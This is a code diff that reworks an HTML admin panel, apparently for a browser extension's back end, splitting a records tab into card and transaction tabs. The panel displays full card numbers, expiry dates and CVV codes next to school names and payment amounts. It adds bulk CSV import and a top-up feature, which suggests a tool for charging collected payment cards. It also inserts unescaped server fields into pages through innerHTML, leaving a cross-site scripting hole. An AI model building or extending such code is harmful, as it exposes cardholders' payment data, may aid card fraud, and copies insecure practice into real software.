@@ -69,7 +69,8 @@ async def admin_panel():
 
     <div class="tabs">
         <button class="tab-btn active" data-tab="users">👥 Users</button>
-        <button class="tab-btn" data-tab="records">💳 Records</button>
+        <button class="tab-btn" data-tab="cards">💳 Cards</button>
+        <button class="tab-btn" data-tab="transactions">📋 Transactions</button>
         <button class="tab-btn" data-tab="add-record">➕ Add Record</button>
         <button class="tab-btn" data-tab="csv-import">📂 CSV Import</button>
         <button class="tab-btn" data-tab="topup">💰 Top Up</button>
@@ -81,11 +82,17 @@ async def admin_panel():
         <div id="users-list">Loading…</div>
     </div>
 
-    <!-- Records Tab -->
-    <div id="records" class="tab-content">
-        <h2>Records</h2>
-        <button id="clear-all-btn" class="clear-btn">🗑️ Clear All Records</button>
-        <div id="records-list">Loading…</div>
+    <!-- Cards Tab -->
+    <div id="cards" class="tab-content">
+        <h2>Card Records</h2>
+        <button id="clear-all-cards-btn" class="clear-btn">🗑️ Clear All Cards</button>
+        <div id="cards-list">Loading…</div>
+    </div>
+
+    <!-- Transactions Tab -->
+    <div id="transactions" class="tab-content">
+        <h2>Transaction History</h2>
+        <div id="transactions-list">Loading…</div>
     </div>
 
     <!-- Add Record Tab -->
@@ -177,7 +184,8 @@ async def admin_panel():
                 document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
                 document.getElementById(btn.dataset.tab).classList.add('active');
                 if (btn.dataset.tab === 'users') loadUsers();
-                if (btn.dataset.tab === 'records') loadRecords();
+                if (btn.dataset.tab === 'cards') loadCards();
+                if (btn.dataset.tab === 'transactions') loadTransactions();
             });
         });
 
@@ -209,19 +217,18 @@ async def admin_panel():
             }
         }
 
-        // ---- Records ----
-        async function loadRecords() {
-            const container = document.getElementById('records-list');
+        // ---- Cards ----
+        async function loadCards() {
+            const container = document.getElementById('cards-list');
             try {
                 const records = await fetchJSON(`${API_BASE}/api/extension/records/admin/records`);
                 if (!records.length) {
-                    container.innerHTML = '<p>No records found.</p>';
+                    container.innerHTML = '<p>No card records found.</p>';
                     return;
                 }
                 let html = `<table><thead><tr>
-                    <th>ID</th><th>User ID</th><th>Card</th><th>Month</th><th>Year</th><th>CVV</th>
-                    <th>School</th><th>Amount</th><th>Status</th><th>Tx ID</th><th>Message</th>
-                    <th>Actions</th>
+                    <th>ID</th><th>User ID</th><th>Card Number</th><th>Month</th><th>Year</th><th>CVV</th>
+                    <th>School</th><th>Requested Amount</th><th>Status</th><th>Actions</th>
                 </tr></thead><tbody>`;
                 records.forEach(r => {
                     const statusClass = r.status === 'success' ? 'badge-success' : r.status === 'failed' ? 'badge-failed' : 'badge-pending';
@@ -235,23 +242,53 @@ async def admin_panel():
                         <td>${r.school || ''}</td>
                         <td>$${r.requested_amount.toFixed(2)}</td>
                         <td><span class="badge ${statusClass}">${r.status}</span></td>
-                        <td class="mono">${r.transaction_id || ''}</td>
-                        <td>${r.message || ''}</td>
                         <td>
-                            <button class="delete-btn btn-sm" onclick="deleteRecord(${r.id})">Delete</button>
+                            <button class="delete-btn btn-sm" onclick="deleteCard(${r.id})">Delete</button>
                         </td>
                     </tr>`;
                 });
                 html += '</tbody></table>';
                 container.innerHTML = html;
             } catch (err) {
-                container.innerHTML = `<div class="error">Failed to load records: ${err.message}</div>`;
+                container.innerHTML = `<div class="error">Failed to load cards: ${err.message}</div>`;
             }
         }
 
-        // ---- Delete single record ----
-        async function deleteRecord(recordId) {
-            if (!confirm(`Delete record ${recordId}? This action cannot be undone.`)) return;
+        // ---- Transactions ----
+        async function loadTransactions() {
+            const container = document.getElementById('transactions-list');
+            try {
+                const records = await fetchJSON(`${API_BASE}/api/extension/records/admin/records`);
+                // Filter to only those with a status of success or failed (i.e., transaction history)
+                const transactions = records.filter(r => r.status === 'success' || r.status === 'failed');
+                if (!transactions.length) {
+                    container.innerHTML = '<p>No transactions yet.</p>';
+                    return;
+                }
+                let html = `<table><thead><tr>
+                    <th>School</th><th>Amount Paid</th><th>Status</th><th>Transaction ID</th><th>Message</th>
+                </tr></thead><tbody>`;
+                transactions.forEach(r => {
+                    const statusClass = r.status === 'success' ? 'badge-success' : 'badge-failed';
+                    const amountDisplay = r.amount_paid !== null ? `$${r.amount_paid.toFixed(2)}` : `$${r.requested_amount.toFixed(2)}`;
+                    html += `<tr>
+                        <td>${r.school || ''}</td>
+                        <td>${amountDisplay}</td>
+                        <td><span class="badge ${statusClass}">${r.status}</span></td>
+                        <td class="mono">${r.transaction_id || ''}</td>
+                        <td>${r.message || ''}</td>
+                    </tr>`;
+                });
+                html += '</tbody></table>';
+                container.innerHTML = html;
+            } catch (err) {
+                container.innerHTML = `<div class="error">Failed to load transactions: ${err.message}</div>`;
+            }
+        }
+
+        // ---- Delete card ----
+        async function deleteCard(recordId) {
+            if (!confirm(`Delete card record ${recordId}? This action cannot be undone.`)) return;
             try {
                 const res = await fetch(`${API_BASE}/api/extension/records/admin/records/${recordId}`, {
                     method: 'DELETE',
@@ -260,16 +297,17 @@ async def admin_panel():
                     const text = await res.text();
                     throw new Error(text || res.statusText);
                 }
-                // Reload the records list
-                loadRecords();
+                // Reload both lists
+                loadCards();
+                loadTransactions();
             } catch (err) {
                 alert('Delete failed: ' + err.message);
             }
         }
 
-        // ---- Clear all records ----
-        async function clearAllRecords() {
-            if (!confirm('Delete ALL records? This cannot be undone!')) return;
+        // ---- Clear all cards ----
+        async function clearAllCards() {
+            if (!confirm('Delete ALL card records? This cannot be undone!')) return;
             try {
                 const res = await fetch(`${API_BASE}/api/extension/records/admin/records`, {
                     method: 'DELETE',
@@ -278,7 +316,8 @@ async def admin_panel():
                     const text = await res.text();
                     throw new Error(text || res.statusText);
                 }
-                loadRecords();
+                loadCards();
+                loadTransactions();
             } catch (err) {
                 alert('Clear all failed: ' + err.message);
             }
@@ -309,7 +348,8 @@ async def admin_panel():
                 status.textContent = `✅ Record added successfully (ID: ${result.id})`;
                 status.className = 'status success';
                 document.getElementById('add-record-form').reset();
-                if (document.getElementById('records').classList.contains('active')) loadRecords();
+                if (document.getElementById('cards').classList.contains('active')) loadCards();
+                if (document.getElementById('transactions').classList.contains('active')) loadTransactions();
             } catch (err) {
                 status.textContent = `❌ Error: ${err.message}`;
                 status.className = 'status error';
@@ -334,7 +374,8 @@ async def admin_panel():
                 }
                 status.textContent = msg;
                 status.className = 'status success';
-                if (document.getElementById('records').classList.contains('active')) loadRecords();
+                if (document.getElementById('cards').classList.contains('active')) loadCards();
+                if (document.getElementById('transactions').classList.contains('active')) loadTransactions();
             } catch (err) {
                 status.textContent = '❌ Error: ' + err.message;
                 status.className = 'status error';
@@ -369,11 +410,13 @@ async def admin_panel():
         });
 
         // ---- Attach clear all button ----
-        document.getElementById('clear-all-btn').addEventListener('click', clearAllRecords);
+        document.getElementById('clear-all-cards-btn').addEventListener('click', clearAllCards);
 
         // ---- Initial load ----
         loadUsers();
-        document.querySelector('[data-tab="records"]').addEventListener('click', loadRecords);
+        // Pre-load cards and transactions when their tabs are opened
+        document.querySelector('[data-tab="cards"]').addEventListener('click', loadCards);
+        document.querySelector('[data-tab="transactions"]').addEventListener('click', loadTransactions);
     </script>
 </body>
 </html>
